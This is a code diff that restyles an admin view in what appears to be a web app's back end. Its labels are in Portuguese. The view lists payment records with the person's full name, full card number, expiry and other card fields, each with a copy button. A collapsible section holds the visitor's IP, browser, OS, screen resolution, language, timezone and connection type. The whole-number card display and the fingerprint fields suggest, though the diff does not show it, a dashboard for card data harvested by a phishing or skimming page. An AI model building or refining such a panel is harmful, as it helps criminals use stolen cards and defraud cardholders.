@@ -625,13 +625,13 @@ const Admin = () => {
               </div>
             </div>
           ) : parsedData ? (
-            <div className="space-y-5">
+            <div className="space-y-0 max-h-[70vh] overflow-y-auto pr-4 -mr-4">
               {/* Informações Pessoais Section */}
-              <div>
-                <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wide mb-3 px-1">
+              <div className="border-b border-border/50 pb-5 last:border-b-0">
+                <h3 className="text-xs font-bold text-foreground uppercase tracking-widest mb-4 px-1 opacity-70">
                   Informações Pessoais
                 </h3>
-                <div className="space-y-3">
+                <div className="space-y-2">
                   <CopyableField
                     label="Nome Completo"
                     value={parsedData.nome}
@@ -646,17 +646,17 @@ const Admin = () => {
               </div>
 
               {/* Dados do Cartão Section */}
-              <div className="pt-2">
-                <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wide mb-3 px-1">
+              <div className="border-b border-border/50 pt-5 pb-5 last:border-b-0">
+                <h3 className="text-xs font-bold text-foreground uppercase tracking-widest mb-4 px-1 opacity-70">
                   Dados do Cartão
                 </h3>
-                <div className="space-y-3">
+                <div className="space-y-2">
                   <CopyableField
                     label="Número do Cartão"
                     value={parsedData.cartao}
                     fieldName="Cartão"
                   />
-                  <div className="grid grid-cols-2 gap-3">
+                  <div className="grid grid-cols-2 gap-2">
                     <CopyableField
                       label="Validade"
                       value={parsedData.validade}
@@ -676,9 +676,9 @@ const Admin = () => {
                 </div>
               </div>
 
-              {/* Data e Hora */}
-              <div className="pt-2">
-                <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wide mb-3 px-1">
+              {/* Data e Hora Section */}
+              <div className="border-b border-border/50 pt-5 pb-5 last:border-b-0">
+                <h3 className="text-xs font-bold text-foreground uppercase tracking-widest mb-4 px-1 opacity-70">
                   Data e Hora
                 </h3>
                 <CopyableField
@@ -688,81 +688,98 @@ const Admin = () => {
                 />
               </div>
 
-              {/* Informações do Dispositivo */}
+              {/* Informações do Dispositivo - Collapsible */}
               {(parsedData.ip || parsedData.navegador || parsedData.so || parsedData.dispositivo) && (
-                <div className="pt-2">
-                  <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wide mb-3 px-1">
-                    Informações do Dispositivo
-                  </h3>
-                  <div className="space-y-3">
-                    {parsedData.ip && (
-                      <CopyableField
-                        label="IP"
-                        value={parsedData.ip}
-                        fieldName="IP"
-                      />
-                    )}
-                    {parsedData.navegador && (
-                      <CopyableField
-                        label="Navegador"
-                        value={parsedData.navegador}
-                        fieldName="Navegador"
-                      />
-                    )}
-                    {parsedData.so && (
-                      <CopyableField
-                        label="Sistema Operacional"
-                        value={parsedData.so}
-                        fieldName="SO"
-                      />
-                    )}
-                    {parsedData.dispositivo && (
-                      <CopyableField
-                        label="Tipo de Dispositivo"
-                        value={parsedData.dispositivo}
-                        fieldName="Dispositivo"
-                      />
-                    )}
-                    {parsedData.resolucao && (
-                      <CopyableField
-                        label="Resolução"
-                        value={parsedData.resolucao}
-                        fieldName="Resolução"
-                      />
-                    )}
-                    {parsedData.idioma && (
-                      <CopyableField
-                        label="Idioma"
-                        value={parsedData.idioma}
-                        fieldName="Idioma"
-                      />
-                    )}
-                    {parsedData.fuso && (
-                      <CopyableField
-                        label="Fuso Horário"
-                        value={parsedData.fuso}
-                        fieldName="Fuso"
-                      />
-                    )}
-                    {parsedData.conexao && (
-                      <CopyableField
-                        label="Tipo de Conexão"
-                        value={parsedData.conexao}
-                        fieldName="Conexão"
-                      />
-                    )}
-                  </div>
+                <div className="border-b border-border/50 pt-5 pb-5 last:border-b-0">
+                  <button
+                    onClick={() => toggleSection('deviceInfo')}
+                    className="w-full flex items-center justify-between mb-0 hover:opacity-80 transition-opacity group"
+                  >
+                    <div className="flex items-center gap-3">
+                      <Smartphone className="h-4 w-4 text-primary opacity-60 group-hover:opacity-100 transition-opacity" />
+                      <h3 className="text-xs font-bold text-foreground uppercase tracking-widest opacity-70 group-hover:opacity-100 transition-opacity">
+                        Informação do Dispositivo
+                      </h3>
+                    </div>
+                    <ChevronDown
+                      className={`h-4 w-4 text-muted-foreground transition-transform duration-200 ${
+                        expandedSections.deviceInfo ? 'rotate-180' : ''
+                      }`}
+                    />
+                  </button>
+
+                  {expandedSections.deviceInfo && (
+                    <div className="space-y-2 mt-4 pt-4 border-t border-border/30">
+                      {parsedData.ip && (
+                        <CopyableField
+                          label="IP"
+                          value={parsedData.ip}
+                          fieldName="IP"
+                        />
+                      )}
+                      {parsedData.navegador && (
+                        <CopyableField
+                          label="Navegador"
+                          value={parsedData.navegador}
+                          fieldName="Navegador"
+                        />
+                      )}
+                      {parsedData.so && (
+                        <CopyableField
+                          label="Sistema Operacional"
+                          value={parsedData.so}
+                          fieldName="SO"
+                        />
+                      )}
+                      {parsedData.dispositivo && (
+                        <CopyableField
+                          label="Tipo de Dispositivo"
+                          value={parsedData.dispositivo}
+                          fieldName="Dispositivo"
+                        />
+                      )}
+                      {parsedData.resolucao && (
+                        <CopyableField
+                          label="Resolução"
+                          value={parsedData.resolucao}
+                          fieldName="Resolução"
+                        />
+                      )}
+                      {parsedData.idioma && (
+                        <CopyableField
+                          label="Idioma"
+                          value={parsedData.idioma}
+                          fieldName="Idioma"
+                        />
+                      )}
+                      {parsedData.fuso && (
+                        <CopyableField
+                          label="Fuso Horário"
+                          value={parsedData.fuso}
+                          fieldName="Fuso"
+                        />
+                      )}
+                      {parsedData.conexao && (
+                        <CopyableField
+                          label="Tipo de Conexão"
+                          value={parsedData.conexao}
+                          fieldName="Conexão"
+                        />
+                      )}
+                    </div>
+                  )}
                 </div>
               )}
 
               {/* Action Buttons */}
-              <div className="flex justify-end gap-2 pt-4 border-t border-border">
+              <div className="flex justify-end gap-2 pt-6 mt-6 border-t border-border">
                 <Button
                   variant="outline"
                   onClick={() => {
                     setSelectedPayment(null);
                     setPaymentDetails('');
                     setParsedData(null);
+                    setExpandedSections({ deviceInfo: false });
                   }}
                 >
                   Fechar
